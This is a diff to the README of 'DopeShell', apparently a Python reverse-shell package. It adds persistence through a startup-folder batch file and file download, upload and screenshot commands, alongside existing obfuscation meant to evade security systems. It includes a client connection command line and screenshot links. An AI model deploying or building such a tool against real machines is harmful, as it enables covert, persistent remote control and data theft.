@@ -13,6 +13,8 @@
 - **Command Prompt Simulation**: The reverse shell simulates the target's command-line interface, making it appear as if the commands are being executed locally.
 - **Obfuscation Techniques**: Implements basic obfuscation to avoid detection by security systems.
 - **Customizable**: Easily configure host, port, and encryption key via command-line arguments.
+- **Persistence**: Easily set up persistence by saving a batch file in the startup folder to ensure reconnection on boot
+- **Useful commands**: Provides useful commands like download, upload, screenshot to enhance interactivity of the shell
 
 ## **Directory Structure**
 
@@ -65,10 +67,18 @@ dopeshell-client --server-ip 192.168.1.11 --port 4444 --key "myverystrongpasswor
 ### **Usage commands:**
 - switch NUMBER [To switch between available sessions]
 - exit [To exit the session] <br><br><br>
-*Image1- Running commands*
+- persist [Set up persistence to enusre connection on reboot]<br><br><br>
+
+*Image1- initializaiton*
+![Runing server](https://github.com/anonymous300502/DopeShellPyPi/blob/main/screenshots/running.png)
+*Image2- Running commands*
 ![basic_usage_1](https://raw.githubusercontent.com/manaswii/DopeShellPyPi/main/screenshots/basic_usage_1.png)<br><br><br>
-*Image2- Switching between sessions*
-![basic_usage_2](https://raw.githubusercontent.com/manaswii/DopeShellPyPi/main/screenshots/basic_usage_2.png)<br><br><br>
+*Image3- Switching between sessions* <br>
+![basic_usage_2](https://github.com/anonymous300502/DopeShellPyPi/blob/main/screenshots/improved_exit_and_switch.png)<br><br><br>
+*Image4- Setting up persistence* <br>
+![presist](https://github.com/anonymous300502/DopeShellPyPi/blob/main/screenshots/persistence.png)<br><br><br>
+*Image5- In-Shell commands* <br>
+![commands](https://github.com/anonymous300502/DopeShellPyPi/blob/main/screenshots/commands.png)
 
 ### **Here are sample snippets if you wish to use the library in your own code:**
 - test_server.py
